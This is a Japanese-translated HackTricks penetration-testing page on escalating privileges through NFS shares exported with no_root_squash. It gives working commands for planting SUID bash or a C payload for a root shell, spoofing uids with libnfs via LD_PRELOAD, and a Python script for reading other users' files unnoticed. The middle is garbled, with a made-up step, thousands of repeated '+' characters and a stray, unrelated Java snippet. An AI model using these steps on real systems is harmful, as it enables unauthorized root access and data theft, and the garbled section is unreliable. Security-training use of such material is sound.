<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手**したいですか、またはHackTricksを**PDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>


_ **/etc/exports** _ ファイルを読み取ります。**no\_root\_squash** として設定されたディレクトリが見つかった場合、**クライアントとしてアクセス**し、そのディレクトリに**ローカルのroot**として書き込むことができます。

**no\_root\_squash**: このオプションは、クライアントのrootユーザーにNFSサーバー上のファイルにrootとしてアクセスする権限を与えます。これには深刻なセキュリティ上の問題が発生する可能性があります。

**no\_all\_squash:** これは **no\_root\_squash** オプションと似ていますが、**非rootユーザー**に適用されます。nobodyユーザーとしてシェルを持っていると想像してください。/etc/exportsファイルをチェックし、no\_all\_squashオプションが存在することを確認します。/etc/passwdファイルをチェックし、非rootユーザーをエミュレートします。そのユーザーとしてsuidファイルを作成します（NFSを使用してマウント）。nobodyユーザーとしてsuidを実行し、別のユーザーになります。

# 特権エスカレーション

## リモートエクスプロイト

この脆弱性を見つけた場合、次のように悪用することができます：

* クライアントマシンでそのディレクトリを**マウント**し、**rootとして**マウントされたフォルダに**/bin/bash**バイナリを**コピー**し、それに**SUID**権限を与え、**被害者の**マシンからそのbashバイナリを実行します。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **クライアントマシンにそのディレクトリをマウント**し、**ルートとして**マウントされたフォルダに、SUID権限を乱用するためのコンパイル済みのペイロードをコピーします。そして、そのバイナリを**被害者のマシンから実行**します（ここでいくつかの[C SUIDペイロード](payloads-to-execute.md#c)を見つけることができます）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## ローカルエクスプロイト

{% hint style="info" %}
自分のマシンから被害者のマシンへのトンネルを作成できる場合、必要なポートをトンネリングしてこの特権エスカレーションを悪用するために、まだリモートバージョンを使用することができます。\
次のトリックは、ファイル `/etc/exports` が IP を示している場合のものです。この場合、リモートエクスプロイトを使用することはできず、このトリックを悪用する必要があります。\
エクスプロイトが機能するためのもう1つの必要条件は、`/etc/export` 内のエクスポートが `insecure` フラグを使用していることです。\
--_`/etc/export` が IP アドレスを示している場合、このトリックが機能するかどうかはわかりません_--
{% endhint %}

**以下のトリックは** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html) **からコピーされました**

さて、共有サーバーはまだ `no_root_squash` を実行していますが、共有をペンテストマシンにマウントすることができない理由が何かあると仮定しましょう。これは、`/etc/exports` に共有をマウントすることが許可されているIPアドレスの明示的なリストがある場合に発生します。

共有のリストを表示すると、マウントすることが許可されているのは、私たちが特権エスカレーションを試みているマシンだけです：
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
これは、特権のないユーザーからローカルでマウントされた共有を悪用することに制限されていることを意味します。しかし、偶然にも、もう1つのあまり知られていないローカルエクスプロイトが存在します。

このエクスプロイトは、NFSv3仕様の問題に依存しており、クライアントが共有にアクセスする際にuid/gidを広告するのはクライアントの責任であると規定しています。したがって、共有が既にマウントされている場合、NFS RPC呼び出しを偽造することでuid/gidを偽装することが可能です！

[こちらのライブラリ](https://github.com/sahlberg/libnfs)を使用すると、それが可能です。

### 例のコンパイル <a href="#compiling-the-example" id="compiling-the-example"></a>

カーネルによっては、例を適応する必要があるかもしれません。私の場合、fallocateシスコールをコメントアウトする必要がありました。
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### ライブラリを使用した攻撃 <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

最もシンプルな攻撃を使用しましょう：
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
以下の手順で、共有ディレクトリにエクスプロイトを配置し、RPC呼び出しでuidを偽装してsuid rootに設定します。

```bash
# エクスプロイトを作成し、実行権限を付与します
$ echo -e '#!/bin/bash\n/bin/bash' > exploit.sh
$ chmod +x exploit.sh

# 共有ディレクトリにエクスプロイトをコピーします
$ cp exploit.sh /mnt/share/exploit.sh

# RPC呼び出しでuidを偽装します
$ echo '+ + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + 1;
        }
        return result;
    }

    public static void main(String[] args) {
        System.out.println(new Solution().findMin(new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}));
    }
}
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
残るは、それを起動するだけです。
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
ここで、ローカルルート特権昇格です！

## ボーナスNFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

マシン上でローカルルートを取得した後、ピボットするための可能な秘密を持つNFS共有を略奪したかったです。しかし、uidの不一致のために、rootであっても読むことができない多くのユーザーが共有を使用していました。chown -Rのような明らかな痕跡を残したくありませんでしたので、所望のシェルコマンドを実行する前に自分のuidを設定する小さなスニペットを作成しました。
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
次に、スクリプトを前置きして通常通りのコマンドを実行できます。
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
